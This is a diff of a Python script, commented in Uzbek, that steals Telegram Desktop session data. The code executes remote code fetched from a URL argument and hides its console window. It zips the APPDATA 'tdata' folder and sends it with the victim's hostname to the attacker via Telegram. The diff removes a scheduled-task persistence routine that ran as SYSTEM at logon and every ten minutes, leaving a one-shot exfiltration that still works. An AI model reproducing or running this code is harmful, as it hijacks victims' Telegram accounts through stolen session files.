@@ -1,6 +1,6 @@
-import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json, subprocess
+import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
-# 1. O'z-o'zini ishga tushirish
+# O'z-o'zini ishga tushirish
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -8,7 +8,7 @@ if len(sys.argv) > 0 and "http" in sys.argv[0]:
     except:
         pass
 
-# 2. Qora oynani yashirish
+# Qora oynani yashirish
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -48,6 +48,7 @@ def zip_and_send():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
+    
     if os.path.exists(tdata_path):
         try:
             temp_dir = tempfile.gettempdir()
@@ -59,35 +60,10 @@ def zip_and_send():
                             file_path = os.path.join(root, file)
                             zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                         except: pass
-            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi (Task Scheduler orqali)!")
+            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
             os.remove(zip_path)
-        except: pass
-    else:
-        send_telegram_message("⚠️ tdata topilmadi!")
-
-# MAIN: O'zini Task Scheduler ga qo'shish
-def main():
-    pc_name = socket.gethostname()
-    script_path = os.path.join(tempfile.gettempdir(), "checker.py")
-    
-    # Agar fayl internetdan kelsa, uni kompyuterga yuklab olamiz
-    if not os.path.exists(script_path):
-        content = urllib.request.urlopen(sys.argv[0]).read().decode()
-        with open(script_path, 'w') as f:
-            f.write(content)
-    
-    # Task Scheduler ga vazifa qo'shish (Har bir foydalanuvchi kirganda va har 10 daqiqada)
-    task_name = "TelegramChecker"
-    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{sys.executable}\" \"{script_path}\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
-    subprocess.run(cmd, shell=True)
-    
-    # Hozirgi tdata ni yuborish
-    zip_and_send()
-    
-    # Endi doimiy ishlash (faqat yuborish uchun)
-    while True:
-        time.sleep(600) # Har 10 daqiqada yuboradi
-        zip_and_send()
+        except:
+            pass
 
 if __name__ == "__main__":
-    main()
+    zip_and_send()
